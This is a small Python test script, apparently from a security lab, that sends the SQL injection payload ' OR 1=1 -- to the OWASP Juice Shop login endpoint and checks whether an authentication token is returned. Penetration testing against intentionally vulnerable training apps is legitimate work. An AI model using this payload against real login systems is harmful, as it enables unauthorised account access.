
#!/usr/bin/env python3
"""
JUICE-001: SQL Injection - Login Bypass

Purpose:
Test whether SQL injection allows unauthorized login
to the OWASP Juice Shop application.

Reference:
OWASP Juice Shop - Login endpoint
POST /rest/user/login

Authorized testing only.
"""

import requests
import sys

# Juice Shop base URL
BASE_URL = (
    sys.argv[1]
    if len(sys.argv) > 1
    else "http://localhost:3000"
)

# SQL injection payload used in the lab
PAYLOAD = "' OR 1=1 --"

def main():
    endpoint = f"{BASE_URL}/rest/user/login"

    # Send login request
    response = requests.post(
        endpoint,
        json={
            "email": PAYLOAD,
            "password": "anything"
        },
        timeout=15
    )

    print("Endpoint:", endpoint)
    print("HTTP Status:", response.status_code)

    # Check the response
    if response.status_code == 200:
        print("Login request accepted.")

        data = response.json()
        authentication = data.get("authentication", {})

        print("Authentication token received:",
              bool(authentication.get("token")))
    else:
        print("Login bypass was not successful.")
        print("Response:", response.text[:300])


if __name__ == "__main__":
    main()
